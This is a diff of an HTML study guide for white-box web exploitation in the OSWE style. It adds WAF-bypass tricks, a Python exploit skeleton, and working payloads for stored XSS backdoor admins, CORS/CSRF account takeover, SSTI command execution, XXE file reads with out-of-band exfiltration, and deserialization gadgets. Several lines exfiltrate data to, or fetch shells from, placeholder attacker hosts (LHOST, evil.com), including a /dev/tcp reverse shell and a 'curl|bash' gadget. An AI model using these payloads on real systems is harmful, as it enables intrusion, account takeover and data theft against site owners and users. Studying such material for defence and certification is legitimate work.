+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Upload</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings LFI</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-waf-bypass">1.12 WAF Bypass</h3>
+<ul><li>When a WAF blocks your payloads, use encoding tricks, alternate syntax, and protocol-level bypasses.</li></ul>
+<h3 id="methodology-waf-bypass-sqli-waf">1.12.1 SQLi WAF Bypass</h3>
+  <ul>
+    <li>Case and comment tricks:
+      <ul>
+        <li>Case variation: <code>SeLeCt</code>, <code>uNiOn</code></li>
+        <li>Inline comments: <code>SE/**/LECT</code>, <code>UN/**/ION</code></li>
+        <li>MySQL version comments: <code>SELECT/*!32302 1*/</code></li>
+      </ul>
+    </li>
+    <li>Whitespace alternatives:
+      <ul>
+        <li>Tab: <code>%09</code>, newline: <code>%0a</code>, carriage return: <code>%0d</code></li>
+        <li>Parentheses as separators: <code>SELECT(username)FROM(users)</code></li>
+      </ul>
+    </li>
+    <li>Encoding bypasses:
+      <ul>
+        <li>Double encoding: <code>%2527</code> decodes to <code>%27</code> then <code>'</code></li>
+        <li>Unicode: <code>%u0027</code> for single quote</li>
+        <li>Hex: <code>0x61646d696e</code> for string <code>admin</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-waf-bypass-xss-waf">1.12.2 XSS WAF Bypass</h3>
+  <ul>
+    <li>Alternate event handlers:
+      <ul>
+        <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+        <li><code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+        <li><code>&lt;marquee onstart=alert(1)&gt;</code></li>
+        <li><code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</code></li>
+      </ul>
+    </li>
+    <li>Encoding-based bypass:
+      <ul>
+        <li>HTML entities: <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code></li>
+        <li>JavaScript hex escapes: <code>\\x3cscript\\x3ealert(1)\\x3c/script\\x3e</code></li>
+        <li>Template literals: <code>${{alert`1`}}</code></li>
+      </ul>
+    </li>
+    <li>CSP bypass techniques:
+      <ul>
+        <li>Find a whitelisted CDN that hosts <code>angular.js</code> and use <code>ng-app</code> + <code>ng-csp</code></li>
+        <li>JSONP callback injection on whitelisted domains</li>
+        <li>Base-tag injection: <code>&lt;base href="http://evil.com/"&gt;</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XSS</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-exploit-scripting">1.13 Exploit Scripting</h3>
+<ul><li>Chain all findings into a single Python exploit script that achieves the objective end-to-end.</li></ul>
+<h3 id="methodology-exploit-scripting-skeleton">1.13.1 Python Exploit Skeleton</h3>
+  <ul>
+    <li>Set up the script structure:
+      <ul>
+        <li><code>import requests, sys, re, urllib3</code></li>
+        <li><code>urllib3.disable_warnings()</code></li>
+        <li><code>s = requests.Session()</code></li>
+        <li><code>s.verify = False</code></li>
+        <li><code>s.proxies = {{"http": "http://127.0.0.1:8080"}}</code> for Burp interception during dev</li>
+      </ul>
+    </li>
+    <li>One function per exploit stage:
+      <ul>
+        <li>Stage 1: <code>authenticate()</code> &mdash; get a session or bypass auth</li>
+        <li>Stage 2: <code>exploit()</code> &mdash; trigger the vulnerability</li>
+        <li>Stage 3: <code>post_exploit()</code> &mdash; extract data or get shell</li>
+      </ul>
+    </li>
+    <li>Argument handling at the top:
+      <ul>
+        <li><code>if len(sys.argv) != 3: print(f"Usage: {{sys.argv[0]}} &lt;target&gt; &lt;lhost&gt;"); sys.exit(1)</code></li>
+        <li><code>TARGET = sys.argv[1]</code></li>
+        <li><code>LHOST = sys.argv[2]</code></li>
+      </ul>
+    </li>
+    <li>Main execution flow:
+      <ul>
+        <li><code>if __name__ == "__main__":</code></li>
+        <li>Call each stage function in order</li>
+        <li>Print status messages for each stage</li>
+        <li>Handle errors gracefully with <code>try/except</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests, sys, re, urllib3
+urllib3.disable_warnings()
+
+if len(sys.argv) != 3:
+    print(f"Usage: {sys.argv[0]} &lt;target&gt; &lt;lhost&gt;")
+    sys.exit(1)
+
+TARGET = sys.argv[1]
+LHOST  = sys.argv[2]
+s = requests.Session()
+s.verify = False
+s.proxies = {"http": "http://127.0.0.1:8080"}   # Burp
+
+def authenticate():
+    print("[*] Stage 1 — Authenticating...")
+    r = s.post(f"{TARGET}/login", data={"user":"admin","pass":"password"})
+    assert "dashboard" in r.text, "[-] Auth failed"
+    print("[+] Authenticated")
+
+def exploit():
+    print("[*] Stage 2 — Triggering vulnerability...")
+    payload = "PAYLOAD_HERE"
+    r = s.get(f"{TARGET}/vuln?param={payload}")
+    print(f"[+] Exploit sent — status {r.status_code}")
+
+def post_exploit():
+    print("[*] Stage 3 — Post-exploitation...")
+    r = s.get(f"{TARGET}/flag.txt")
+    print(f"[+] Flag: {r.text.strip()}")
+
+if __name__ == "__main__":
+    try:
+        authenticate()
+        exploit()
+        post_exploit()
+    except Exception as e:
+        print(f"[-] Failed: {e}")
+        sys.exit(1)</code></pre>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a> &middot; <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">OWASP Cheat Sheet Series</a></p>
+
+<h3 id="oswe-script-skeleton">1.14 Exploit Script Skeleton</h3>
               <ul>
                 <li>Every exploit follows the same shape: a <code>Session</code>, one function per stage (auth bypass &rarr; primitive &rarr; RCE trigger), arguments at the top, and a <code>main</code> that runs them in order</li>
               </ul>
@@ -239,7 +1570,8 @@ if __name__ == "__main__":
     login_bypass()
     sqli_write_webshell()
     trigger_rce()</code></pre>
-              <h3 id="oswe-source-recovery">1.3 Source Code Recovery (.NET &amp; Java)</h3>
+
+<h3 id="oswe-source-recovery">1.15 Source Code Recovery (.NET &amp; Java)</h3>
               <ul>
                 <li>White-box doesn&rsquo;t always mean human-readable</li>
                 <li>.NET assemblies (DLL/EXE): use <strong>dnSpy</strong> or <strong>ILSpy</strong> for near-source-fidelity C#; both can patch and re-save</li>
@@ -255,7 +1587,7 @@ java -jar cfr.jar app.jar --outputdir ./src/
 unzip app.jar -d app/
 find app -name "*.class" -exec procyon-decompiler -o src {} \;</code></pre>
 
-              <h2 id="oswe-source-review">2. Source Code Review Methodology</h2>
+<h2 id="oswe-source-review">2. Source Code Review Methodology</h2>
               <ul>
                 <li>Start at entry points (routes/controllers that accept input) and follow tainted data downstream</li>
                 <li>Any user input reaching a dangerous sink without sanitization is a vulnerability</li>
@@ -607,7 +1939,10 @@ fetch("/admin/settings", {credentials:"include"})
     });
   })</code></pre>
               <h3 id="oswe-xss-stored">5.5 Stored XSS &rarr; Persistent Admin Backdoor</h3>
-              <ul><li>Find a field stored and later rendered to an admin (support tickets, profiles, comments, filenames). The payload waits for the admin&rsquo;s browser to render it, then creates a new admin account or fetches an authenticated RCE endpoint.</li></ul>
+              <ul>
+                <li>Find a field stored and later rendered to an admin (support tickets, profiles, comments, filenames)</li>
+                <li>Payload waits for the admin&rsquo;s browser to render it, then creates a new admin account or fetches an authenticated RCE endpoint</li>
+              </ul>
               <pre><code class="language-javascript">// Stored XSS that creates a backdoor admin via a fetch chain
 &lt;script&gt;
 var t;
@@ -623,7 +1958,10 @@ fetch("/admin/users/new", {credentials:"include"})
   })
 &lt;/script&gt;</code></pre>
               <h3 id="oswe-xss-dom-store">5.6 Persisting XSS Loot via IndexedDB / WebSockets</h3>
-              <ul><li>The openITCOCKPIT advanced-XSS chapter persists scraped admin data into the victim&rsquo;s browser IndexedDB and exfiltrates it back over a websocket. Useful when you need to capture data across page loads, or when the admin&rsquo;s page navigates away before exfil completes.</li></ul>
+              <ul>
+                <li>openITCOCKPIT chapter persists scraped admin data into the victim&rsquo;s browser IndexedDB and exfiltrates over a websocket</li>
+                <li>Useful when you need to capture data across page loads or when the admin&rsquo;s page navigates away before exfil completes</li>
+              </ul>
               <pre><code class="language-javascript">// Open / create a database, store loot, then exfiltrate later
 const req = indexedDB.open("loot", 1);
 req.onupgradeneeded = e =&gt; e.target.result.createObjectStore("d", {autoIncrement: true});
@@ -643,11 +1981,21 @@ ws.onopen = () =&gt; {
 };</code></pre>
 
               <h2 id="oswe-csrf-cors">6. CSRF, CORS &amp; SameSite Bypass</h2>
-              <ul><li>A canonical chain here combines CSRF + permissive CORS into a pre-auth account takeover. The pieces &mdash; Same-Origin Policy, CORS, and SameSite cookies &mdash; need to be reasoned about together.</li></ul>
+              <ul>
+                <li>Canonical chain combines CSRF + permissive CORS into a pre-auth account takeover</li>
+                <li>Same-Origin Policy, CORS, and SameSite cookies need to be reasoned about together</li>
+              </ul>
               <h3 id="oswe-sop">6.1 Same-Origin Policy (SOP)</h3>
-              <ul><li>SOP prevents scripts on origin A from reading responses from origin B. &ldquo;Origin&rdquo; = scheme + host + port. SOP does <em>not</em> block requests being sent (CSRF still works); it blocks <em>reading the response</em>. Anything that bypasses or relaxes SOP &mdash; CORS misconfig, postMessage misuse, JSONP &mdash; can flip a CSRF into a full read-and-write attack.</li></ul>
+              <ul>
+                <li>SOP prevents scripts on origin A from reading responses from origin B</li>
+                <li>&ldquo;Origin&rdquo; = scheme + host + port</li>
+                <li>SOP does <em>not</em> block requests being sent (CSRF still works); it blocks <em>reading the response</em></li>
+                <li>Anything that relaxes SOP &mdash; CORS misconfig, postMessage misuse, JSONP &mdash; can flip a CSRF into a full read-and-write attack</li>
+              </ul>
               <h3 id="oswe-cors">6.2 CORS Misconfiguration</h3>
-              <ul><li>The server can opt to allow cross-origin reads via <code>Access-Control-Allow-Origin</code>. Misconfigurations to look for: reflecting the request <code>Origin</code> verbatim, allowing <code>null</code>, allowing subdomain wildcards (a compromised subdomain abuses the parent), and shipping <code>Access-Control-Allow-Credentials: true</code> alongside a permissive origin (allows reading the response <em>with cookies</em>).</li></ul>
+              <ul>
+                <li>Misconfigurations: reflecting the request <code>Origin</code> verbatim, allowing <code>null</code>, subdomain wildcards, shipping <code>Access-Control-Allow-Credentials: true</code> alongside a permissive origin</li>
+              </ul>
               <pre><code class="language-bash"># Probe for an origin-reflecting CORS policy
 curl -i -H "Origin: http://evil.com" http://target/api/profile
 # If the response includes:
@@ -659,9 +2007,18 @@ curl -i -H "Origin: http://evil.com" http://target/api/profile
 curl -i -H "Origin: null" http://target/api/profile   # sandboxed iframes / data: URIs
 curl -i -H "Origin: http://target.evil.com" http://target/api/profile  # subdomain wildcard</code></pre>
               <h3 id="oswe-samesite">6.3 SameSite Cookies</h3>
-              <ul><li>SameSite controls whether cookies travel cross-site. <code>Strict</code> strips them on any cross-site request; <code>Lax</code> sends them on top-level GET navigations only; <code>None</code> always sends them (requires <code>Secure</code>). On modern browsers cookies default to <code>Lax</code> &mdash; so a classic POST CSRF doesn&rsquo;t carry the session cookie. Bypasses: top-level GET navigations still send Lax cookies; brand-new cookies (&lt; 2 minutes old) bypass Lax in Chrome (the &ldquo;Lax+POST&rdquo; mitigation); cross-site requests from a same-site subdomain carry cookies normally.</li></ul>
+              <ul>
+                <li><code>Strict</code>: strips cookies on any cross-site request</li>
+                <li><code>Lax</code>: sends on top-level GET navigations only</li>
+                <li><code>None</code>: always sends (requires <code>Secure</code>)</li>
+                <li>Modern browsers default to <code>Lax</code> &mdash; classic POST CSRF doesn&rsquo;t carry the session cookie</li>
+                <li>Bypasses: top-level GET navigations still send Lax cookies; brand-new cookies (&lt; 2 minutes old) bypass Lax in Chrome; same-site subdomain requests carry cookies normally</li>
+              </ul>
               <h3 id="oswe-csrf-classic">6.4 Classic CSRF Exploitation</h3>
-              <ul><li>Auto-submit a form from the attacker page; the victim&rsquo;s browser attaches their cookies (subject to SameSite). For JSON endpoints, build the form to encode as JSON or use <code>fetch</code> + a CORS-friendly content type. Pair with a permissive CORS policy to read the response.</li></ul>
+              <ul>
+                <li>Auto-submit a form from the attacker page; the victim&rsquo;s browser attaches their cookies (subject to SameSite)</li>
+                <li>For JSON endpoints, build the form to encode as JSON or use <code>fetch</code> + a CORS-friendly content type</li>
+              </ul>
               <pre><code class="language-html">&lt;!-- Classic auto-submitting form CSRF (works without CSRF token validation) --&gt;
 &lt;html&gt;&lt;body onload="f.submit()"&gt;
   &lt;form id=f action="http://target/admin/adduser" method=POST&gt;
@@ -676,7 +2033,11 @@ curl -i -H "Origin: http://target.evil.com" http://target/api/profile  # subdoma
   &lt;input name='{"user":"hax","pass":"hax","ignore":"' value='"}'&gt;
 &lt;/form&gt;</code></pre>
               <h3 id="oswe-cors-exploit">6.5 CORS + CSRF Exploitation (Concord-Style)</h3>
-              <ul><li>Permissive CORS turns CSRF from &ldquo;send-only&rdquo; into a full read-and-write primitive: read the CSRF token from a page, then post with it. The Concord chapter exploits this against an unauthenticated endpoint plus an insecure default to take over the admin account.</li></ul>
+              <ul>
+                <li>Permissive CORS turns CSRF from &ldquo;send-only&rdquo; into a full read-and-write primitive</li>
+                <li>Read the CSRF token from a page, then POST with it</li>
+                <li>Concord chapter exploits this against an unauthenticated endpoint plus an insecure default to take over the admin account</li>
+              </ul>
               <pre><code class="language-javascript">// Hosted on attacker page. Victim visits while authenticated to target.
 // 1. fetch reads the response thanks to permissive CORS
 // 2. parse the CSRF token from the HTML
@@ -695,9 +2056,15 @@ fetch("http://target/admin", {credentials:"include"})
   .then(t =&gt; fetch("http://LHOST/?d=" + btoa(t)));</code></pre>
 
               <h2 id="oswe-ssti">7. Server-Side Template Injection (SSTI)</h2>
-              <ul><li>The ERPNext chapter chains a pre-auth SQLi to a Jinja2 SSTI. SSTI shows up wherever a template engine renders untrusted data &mdash; render functions, error pages that template the message, mailers that interpolate user input.</li></ul>
+              <ul>
+                <li>ERPNext chapter chains a pre-auth SQLi to a Jinja2 SSTI</li>
+                <li>SSTI appears wherever a template engine renders untrusted data &mdash; render functions, error pages, mailers that interpolate user input</li>
+              </ul>
               <h3 id="oswe-ssti-detect">7.1 Detection</h3>
-              <ul><li>Probe with engine-distinguishing math. Different engines parse different specifier sets, so <code>{{7*7}}</code>, <code>${7*7}</code>, <code>#{7*7}</code>, and <code>&lt;%= 7*7 %&gt;</code> together pinpoint Jinja2/Twig vs Freemarker/Thymeleaf vs Smarty vs ERB.</li></ul>
+              <ul>
+                <li>Probe with engine-distinguishing math expressions</li>
+                <li><code>{{7*7}}</code>, <code>${7*7}</code>, <code>#{7*7}</code>, and <code>&lt;%= 7*7 %&gt;</code> together pinpoint the engine</li>
+              </ul>
               <pre><code class="language-bash"># Probe with math - different engines evaluate differently
 {{7*7}}         # Jinja2/Twig: 49     Freemarker: 49
 ${7*7}          # Freemarker: 49      Thymeleaf/EL: 49     (ERB in Ruby)
@@ -707,7 +2074,10 @@ ${7*7}          # Freemarker: 49      Thymeleaf/EL: 49     (ERB in Ruby)
 {{7*'7'}}       # Jinja2: 7777777   Twig: 49  (distinction)
 a{*comment*}b   # Smarty (empty output = confirmed)</code></pre>
               <h3 id="oswe-ssti-jinja2">7.2 Jinja2 (Python / Flask / Frappe)</h3>
-              <ul><li>Reach Python builtins through the class hierarchy: <code>{}.__class__.__mro__[1].__subclasses__()</code> exposes every subclass of <code>object</code>, including <code>subprocess.Popen</code>. Filtered? Use <code>|attr()</code> with hex-encoded attribute names or compose names with string concatenation.</li></ul>
+              <ul>
+                <li>Reach Python builtins through the class hierarchy: <code>{}.__class__.__mro__[1].__subclasses__()</code></li>
+                <li>Filtered? Use <code>|attr()</code> with hex-encoded attribute names or compose names with string concatenation</li>
+              </ul>
               <pre><code class="language-python"># List all subclasses of object - find subprocess.Popen
 {{''.__class__.__mro__[1].__subclasses__()}}
 # Then execute (index varies; search the output for 'Popen'):
@@ -723,7 +2093,10 @@ a{*comment*}b   # Smarty (empty output = confirmed)</code></pre>
   |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
   |attr('popen')('id')|attr('read')()}}</code></pre>
               <h3 id="oswe-ssti-freemarker">7.3 Freemarker (Java)</h3>
-              <ul><li>Freemarker exposes <code>"freemarker.template.utility.Execute"?new()</code> for OS commands. Newer versions restrict this; fall back to the ClassLoader trick to reach <code>java.lang.Runtime</code>.</li></ul>
+              <ul>
+                <li>Exposes <code>"freemarker.template.utility.Execute"?new()</code> for OS commands</li>
+                <li>Newer versions restrict this; fall back to the ClassLoader trick to reach <code>java.lang.Runtime</code></li>
+              </ul>
               <pre><code class="language-java">// Freemarker: execute via freemarker.template.utility.Execute
 &lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;
 ${ex("id")}
@@ -738,7 +2111,10 @@ ${rt.exec("id")}
 &lt;#assign c = classLoader.loadClass("java.lang.Runtime")&gt;
 ${c.getMethod("exec","".class).invoke(c.getMethod("getRuntime").invoke(null),"id")}</code></pre>
               <h3 id="oswe-ssti-twig">7.4 Twig (PHP)</h3>
-              <ul><li>Twig 1.x exposed <code>_self.env.registerUndefinedFilterCallback</code>. Modern versions block that; abuse filter composition (<code>|map("system")</code>, <code>|sort("system")</code>) or PHP-class chains (<code>|file_get_contents</code>) instead.</li></ul>
+              <ul>
+                <li>Twig 1.x exposed <code>_self.env.registerUndefinedFilterCallback</code></li>
+                <li>Modern versions: abuse filter composition (<code>|map("system")</code>, <code>|sort("system")</code>) or PHP-class chains</li>
+              </ul>
               <pre><code class="language-php">// Twig 1.x
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 
@@ -752,7 +2128,9 @@ ${c.getMethod("exec","".class).invoke(c.getMethod("getRuntime").invoke(null),"id
 &lt;%= system("id") %&gt;
 &lt;%= IO.popen("id").read %&gt;</code></pre>
               <h3 id="oswe-ssti-filter-evasion">7.6 Filter Evasion Inside SSTI</h3>
-              <ul><li>The ERPNext chapter shows a real filter-bypass: dots blocked &rarr; use <code>|attr()</code>; underscores blocked &rarr; build them with concatenation or hex; brackets blocked &rarr; use <code>getattr</code> via filter; reserved words blocked &rarr; split them across string concatenations or use Unicode escapes.</li></ul>
+              <ul>
+                <li>ERPNext chapter shows real filter-bypass: dots blocked &rarr; <code>|attr()</code>; underscores blocked &rarr; concatenation or hex; brackets blocked &rarr; <code>getattr</code> via filter; reserved words &rarr; split across string concatenations or Unicode escapes</li>
+              </ul>
               <pre><code class="language-python"># Bypass "." filter -&gt; use |attr()
 request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
 # Bypass underscore filter
@@ -765,9 +2143,15 @@ getattr(target, 'attr')  # via |attr()
 request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
 
               <h2 id="oswe-xxe">8. XML External Entity (XXE)</h2>
-              <ul><li>The openCRX chapter uses XXE as the first primitive: an XML parser that resolves external entities lets you read local files, scan internal services, and (via parameter entities) achieve out-of-band exfiltration even when the response is blind.</li></ul>
+              <ul>
+                <li>openCRX chapter uses XXE as the first primitive</li>
+                <li>An XML parser that resolves external entities lets you read local files, scan internal services, and achieve OOB exfiltration</li>
+              </ul>
               <h3 id="oswe-xxe-basics">8.1 XML Entities &amp; Vulnerable Parsers</h3>
-              <ul><li>An XML parser that resolves DTDs is exploitable when attacker XML reaches it. Java&rsquo;s default <code>DocumentBuilderFactory</code>, .NET&rsquo;s <code>XmlDocument</code> pre-4.5.2, and many PHP <code>libxml</code> uses are insecure unless explicitly hardened. Look for SOAP endpoints, SAML responses, document parsers (DOCX/XLSX which are zipped XML), and image processors (SVG).</li></ul>
+              <ul>
+                <li>Java&rsquo;s default <code>DocumentBuilderFactory</code>, .NET&rsquo;s <code>XmlDocument</code> pre-4.5.2, and many PHP <code>libxml</code> uses are insecure unless explicitly hardened</li>
+                <li>Look for SOAP endpoints, SAML responses, document parsers (DOCX/XLSX = zipped XML), and image processors (SVG)</li>
+              </ul>
               <pre><code class="language-xml">&lt;!-- Basic file read --&gt;
 &lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
@@ -781,7 +2165,10 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
 &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8500/v1/kv/?recurse"&gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
               <h3 id="oswe-xxe-blind">8.2 Blind / OOB XXE with Parameter Entities</h3>
-              <ul><li>When the response doesn&rsquo;t echo the entity, use <strong>parameter entities</strong> in an external DTD to assemble a URL containing the leaked data and force the parser to fetch it from your server &mdash; the file content lands in your HTTP log.</li></ul>
+              <ul>
+                <li>When the response doesn&rsquo;t echo the entity, use parameter entities in an external DTD</li>
+                <li>Assemble a URL containing the leaked data and force the parser to fetch it from your server</li>
+              </ul>
               <pre><code class="language-xml">&lt;!-- Step 1: send this payload to the target --&gt;
 &lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [
@@ -797,7 +2184,10 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
 &lt;!-- The parser fetches evil.dtd, reads /etc/passwd into %file;,
      wraps it into a SYSTEM URL containing the data, then fetches that URL --&gt;</code></pre>
               <h3 id="oswe-xxe-cdata">8.3 CDATA Trick for Files Containing &lt;, &amp;, &gt;</h3>
-              <ul><li>If the leaked file has XML metacharacters, the entity expansion will break parsing. Wrap the file content in CDATA via concatenated parameter entities &mdash; the openCRX chapter walks this trick.</li></ul>
+              <ul>
+                <li>If the leaked file has XML metacharacters, entity expansion will break parsing</li>
+                <li>Wrap the file content in CDATA via concatenated parameter entities &mdash; the openCRX chapter walks this trick</li>
+              </ul>
               <pre><code class="language-xml">&lt;!-- evil.dtd that CDATA-wraps the leaked file --&gt;
 &lt;!ENTITY % start "&lt;![CDATA["&gt;
 &lt;!ENTITY % file SYSTEM "file:///var/www/html/config.php"&gt;
@@ -806,7 +2196,11 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
 %wrap;
 %send;</code></pre>
               <h3 id="oswe-xxe-rce">8.4 XXE &rarr; RCE Paths</h3>
-              <ul><li>Direct RCE from XXE is rare but possible. PHP with <code>expect://</code> enabled gives a command primitive (rarely available). Java HSQLDB before 2.4.5 has a JDBC connection trick that executes Java code; the openCRX chapter chains XXE &rarr; HSQLDB &rarr; web shell via Java language routines.</li></ul>
+              <ul>
+                <li>Direct RCE from XXE is rare but possible</li>
+                <li>PHP with <code>expect://</code> enabled gives a command primitive (rarely available)</li>
+                <li>Java HSQLDB before 2.4.5: JDBC connection trick that executes Java code; openCRX chapter chains XXE &rarr; HSQLDB &rarr; web shell</li>
+              </ul>
               <pre><code class="language-xml">&lt;!-- PHP expect:// (rarely available) --&gt;
 &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
@@ -815,9 +2209,15 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
      invokes a stored Java function to write a web shell to disk --&gt;</code></pre>
 
               <h2 id="oswe-deserialization">9. Insecure Deserialization</h2>
-              <ul><li>The DotNetNuke chapter exploits .NET cookie deserialization end-to-end; the same patterns appear in Java, PHP, and Node.js. A deserializer that runs magic methods (or instantiates arbitrary classes) on attacker-controlled bytes is RCE when a gadget chain exists in the classpath.</li></ul>
+              <ul>
+                <li>DotNetNuke chapter exploits .NET cookie deserialization end-to-end; same patterns appear in Java, PHP, and Node.js</li>
+                <li>A deserializer that runs magic methods on attacker-controlled bytes is RCE when a gadget chain exists in the classpath</li>
+              </ul>
               <h3 id="oswe-deser-java">9.1 Java Deserialization</h3>
-              <ul><li><code>ObjectInputStream.readObject()</code> invokes deserialized objects&rsquo; <code>readObject</code> methods during construction. With CommonsCollections, Spring, Groovy, or similar libraries on the classpath, a crafted byte stream becomes command execution.</li></ul>
+              <ul>
+                <li><code>ObjectInputStream.readObject()</code> invokes deserialized objects&rsquo; <code>readObject</code> methods during construction</li>
+                <li>With CommonsCollections, Spring, Groovy, or similar libraries on the classpath, a crafted byte stream becomes command execution</li>
+              </ul>
               <pre><code class="language-bash"># Identify the vulnerability: "rO0AB" (base64) or 0xACED0005 (raw) - Java serialized magic bytes
 grep -rn "ObjectInputStream\|readObject\|deserialize" src/
 curl -s http://target/api/endpoint | xxd | head -2   # look for aced 0005 or rO0AB
@@ -835,7 +2235,10 @@ curl -X POST http://target/endpoint --data-binary @payload.ser \
 B64=$(base64 -w0 payload.ser)
 curl -X POST http://target/endpoint -d "data=$B64"</code></pre>
               <h3 id="oswe-deser-php">9.2 PHP Object Injection</h3>
-              <ul><li>PHP&rsquo;s <code>unserialize()</code> reconstructs objects and triggers magic methods (<code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>) on them. If any loaded class has a dangerous magic method that uses its own properties, you control those properties &mdash; the chain ends in file write or command execution.</li></ul>
+              <ul>
+                <li>PHP <code>unserialize()</code> reconstructs objects and triggers magic methods (<code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>)</li>
+                <li>If any loaded class has a dangerous magic method that uses its own properties, you control those properties &mdash; chain ends in file write or command execution</li>
+              </ul>
               <pre><code class="language-php">// Find the vulnerability
 grep -rn "unserialize\s*(" src/
 // Check autoloaded classes - any with __wakeup / __destruct using $this-&gt;file or $this-&gt;cmd?
@@ -857,7 +2260,10 @@ echo serialize($payload);
 phpggc Laravel/RCE1 system id
 phpggc Symfony/RCE4 exec "curl http://LHOST/|bash" --base64</code></pre>
               <h3 id="oswe-deser-dotnet">9.3 .NET Deserialization (DotNetNuke Style)</h3>
-              <ul><li>The DotNetNuke chapter exploits <code>XmlSerializer</code> by abusing <code>ObjectDataProvider</code> wrapped in <code>ExpandedWrapper</code> to call arbitrary methods during deserialization &mdash; the canonical .NET deserialization gadget. <strong>ysoserial.net</strong> generates payloads for every common .NET formatter.</li></ul>
+              <ul>
+                <li>DotNetNuke chapter exploits <code>XmlSerializer</code> by abusing <code>ObjectDataProvider</code> wrapped in <code>ExpandedWrapper</code></li>
+                <li><strong>ysoserial.net</strong> generates payloads for every common .NET formatter</li>
+              </ul>
               <pre><code class="language-bash"># Identify: BinaryFormatter, NetDataContractSerializer, SoapFormatter, LosFormatter, XmlSerializer
 grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter\|XmlSerializer" src/
 
@@ -874,7 +2280,10 @@ ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "whoami &gt; c:\
   --path "/default.aspx" --apppath "/" --decryptionalg AES --decryptionkey AAAA... \
   --validationalg SHA1 --validationkey BBBB... -o base64</code></pre>
               <h3 id="oswe-deser-dotnet-xml">9.4 XmlSerializer Manual Gadget (ObjectDataProvider)</h3>
-              <ul><li>The DotNetNuke chain is worth understanding manually. <code>XmlSerializer</code> won&rsquo;t deserialize <code>ObjectDataProvider</code> directly (it&rsquo;s missing a parameterless constructor), so wrap it in <code>ExpandedWrapper</code>, which has one &mdash; that gets you arbitrary method invocation on any chosen type at deserialization time.</li></ul>
+              <ul>
+                <li><code>XmlSerializer</code> won&rsquo;t deserialize <code>ObjectDataProvider</code> directly (missing parameterless constructor)</li>
+                <li>Wrap it in <code>ExpandedWrapper</code>, which has one &mdash; gives arbitrary method invocation at deserialization time</li>
+              </ul>
               <pre><code class="language-xml">&lt;ExpandedWrapperOfProcessObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
   &lt;ProjectedProperty0&gt;
@@ -887,7 +2296,10 @@ ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "whoami &gt; c:\
   &lt;/ProjectedProperty0&gt;
 &lt;/ExpandedWrapperOfProcessObjectDataProvider&gt;</code></pre>
               <h3 id="oswe-deser-node">9.5 Node.js Deserialization</h3>
-              <ul><li><code>node-serialize</code>&rsquo;s <code>unserialize</code> executes an IIFE syntax that lives inside the serialized object. Any endpoint that calls it on attacker JSON is RCE.</li></ul>
+              <ul>
+                <li><code>node-serialize</code>&rsquo;s <code>unserialize</code> executes an IIFE syntax inside the serialized object</li>
+                <li>Any endpoint that calls it on attacker JSON is RCE</li>
+              </ul>
               <pre><code class="language-javascript">// node-serialize: IIFE inside serialized object
 const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'bash -c \\\'bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1\\\'\');}()"}';
 // Send to any endpoint that calls: require('node-serialize').unserialize(input)
@@ -895,9 +2307,15 @@ const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec
 // serialize-javascript / vm2 escapes - check for eval(data) on deserialized properties</code></pre>
 
               <h2 id="oswe-ssrf">10. Server-Side Request Forgery (SSRF)</h2>
